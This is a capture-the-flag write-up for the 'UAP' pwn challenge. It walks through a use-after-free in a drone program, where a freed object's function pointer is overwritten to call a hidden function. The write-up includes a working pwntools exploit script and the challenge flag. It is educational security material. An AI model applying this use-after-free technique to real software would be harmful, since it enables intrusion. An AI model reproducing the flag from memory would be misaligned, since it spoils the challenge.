https://ctftime.org/event/2446

# UAP (pwn)

I found a UFO! Wait, they call them UAPs now? Whatever, feel free to take take a look 🔎

nc uap.ctf.intigriti.io 1340

## Solution

1) Allocate and free a drone
2) Use after free the drone pointer via `enter_drone_route` such that `drone->start_route` points to `print_drone_manual`
3) Call `print_drone_manual` via `start_drone_route` to get the flag

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./drone", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="b start_drone_route")
p = remote("uap.ctf.intigriti.io", 1340)

def deploy_drone():
    p.sendline(b"1")

def retire_drone():
    p.sendline(b"2")
    p.sendline(b"1")

def start_drone_route():
    p.sendline(b"3")
    p.sendline(b"1")

def enter_drone_route():
    p.sendline(b"4")
    payload = b""
    payload += b"A" * 16
    payload += p64(elf.sym["print_drone_manual"])
    p.sendline(payload)

deploy_drone()
retire_drone()
enter_drone_route()
start_drone_route()

p.readuntil(b"start its route: ")
print(p.readline()[:-2].decode()) # INTIGRITI{un1d3n71f13d_fly1n6_vuln3r4b1l17y}
```

## Flag
`INTIGRITI{un1d3n71f13d_fly1n6_vuln3r4b1l17y}`

smiley 2024/11/16
